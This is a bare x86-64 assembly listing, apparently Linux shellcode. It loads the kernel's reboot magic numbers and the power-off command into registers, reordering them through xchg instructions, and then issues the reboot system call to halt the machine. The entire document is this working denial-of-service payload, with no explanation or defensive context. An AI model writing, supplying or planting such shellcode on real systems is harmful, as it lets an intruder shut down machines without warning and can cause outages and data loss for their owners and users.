section .text
    global _start
_start:
    mov     edx, 0x28121969    
    mov     esi, 0xfee1dead
    mov     edi, 0x4321fedc
    xchg    esi, edx
    xchg    edx, edi
    xor     rax, rax
    add     al, 0xa9
    syscall
